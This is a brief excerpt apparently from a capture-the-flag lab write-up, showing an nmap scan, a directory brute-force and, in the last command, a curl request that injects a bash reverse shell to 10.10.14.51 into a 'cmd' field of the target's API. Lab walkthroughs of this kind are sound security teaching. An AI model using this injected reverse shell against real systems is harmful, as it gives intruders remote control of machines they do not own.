...
```bash
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.10.11.105
Starting Nmap
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
...
```bash
oxdf@hacky$ feroxbuster -u http://10.10.11.105/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
200  GET  index.html
301  GET  /uploads
```
...
```bash
oxdf@hacky$ curl -X POST -d "cmd=bash -i >& /dev/tcp/10.10.14.51/443 0>&1" http://10.10.11.105/api/action
```
